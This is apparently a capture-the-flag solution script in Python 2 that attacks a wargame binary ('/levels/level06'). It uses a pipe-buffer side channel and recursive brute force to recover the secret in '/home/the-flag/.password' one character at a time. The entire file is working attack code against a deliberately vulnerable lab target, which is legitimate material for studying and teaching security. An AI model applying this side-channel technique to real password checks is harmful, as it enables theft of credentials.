import os

def test(guess):
    r, w = os.pipe()
    child = os.fork()
    if child == 0: # in child
        os.dup2(w, 1)
        os.dup2(w, 2)
        os.close(r)
        os.execve("/levels/level06", ["foo", "/home/the-flag/.password", guess], {})
        # print "fail"
        os._exit(1)
    # print "child=",child
    os.close(w)
    inp = os.fdopen(r, "r", 0)
    data = inp.read(100)
    os.kill(child, 9)
    return data

CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
print len(CHARS)

big = "-" * (2**17 - 300)

OUTPUT_PREFIX = "Welcome to the password checker!\n"

def bruteforce(prefix):
    print "bruteforcing ", prefix
    test_chars = set(CHARS)
    while test_chars:
        char = test_chars.pop()
        for retry in xrange(20):
            guess = prefix + char + big
            result = test(guess)[len(OUTPUT_PREFIX):]
            try:
                min_dots = result.index('H')
                if min_dots == len(prefix)+1:
                    # found early Haha. tested password 
                    # cannot be correct, since taunt was
                    # called so early
                    break
            except ValueError:
                # no Haha in output
                pass
        else:
            bruteforce(prefix + char)
    print "nothing remaining in", prefix


import sys
print bruteforce(sys.argv[1])

